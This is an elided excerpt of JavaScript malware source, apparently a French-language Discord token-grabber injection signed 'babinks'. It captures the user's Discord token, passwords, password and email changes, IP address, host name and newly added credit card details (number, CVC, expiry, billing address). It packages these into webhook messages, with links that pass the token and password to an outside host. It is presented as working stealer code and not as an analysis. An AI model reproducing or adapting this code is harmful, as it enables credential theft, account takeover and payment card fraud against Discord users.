...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
			...
			if (fs.existsSync(path.join(__dirname, "init"))) {
				...
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						content: "",
						embeds: [{
							title: "Discord Initalisé (Utilisateur non connecté)",
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							content: "",
							embeds: [{
								title: "Discord Initalisé",
								description: "[**<:partner:909102089513340979> │ Cliquez ici pour copier les informations sur le mobile**](https://furry.surf/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Nom d'hôte: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
		...
		if (!fs.existsSync(path.join(__dirname, "babinksBTW"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "babinksBTW"));
			...
			if (config['logout-notify'] == "true") {
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						content: "",
						embeds: [{
							title: "Déconnexion de l'utilisateur (l'utilisateur ne s'est pas connecté auparavant)",
							color: config["embed-color"],
							fields: [{
								name: "Info",
								value: `\`\`\`Nom de l'hôte: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							content: "",
							embeds: [{
								title: "L'utilisateur a été déconnecté",
								description: "[**<:partner:909102089513340979> │ Cliquez ici pour copier les informations sur le mobile**](https://furry.surf/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Cliquez ici pour copier les informations sur le mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Nom d'hôte: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
									...
									"title": `Total des amis (${totalFriends()})`,
									"color": config['embed-color'],
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Cliquez ici pour copier les informations sur le mobile**](https://furry.surf/raw/"+ token +"<br>"+ newpassword+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Nom d'hôte: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								content: "",
								embeds: [{
									"title": "Changement d'adresse électronique",
									description: "[**<:partner:909102089513340979> │ Cliquez ici pour copier les informations sur le mobile**](https://furry.surf/raw/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
...
function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    ...
    `, !0).then((ip) => {
			...
			var params = {
				...
				content: "",
				embeds: [{
					"title": "Carte de crédit de l'utilisateur ajoutée",
					"description": "**Nom d'utilisateur:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Type de nitro:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Numéro de la carte de crédit: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Pays: **```" + country + "```\n" + "**État: **```" + state + "```\n" + "**Ville: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Rue: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
					"author": {
						"name": "babinks"
					},
					"footer": {
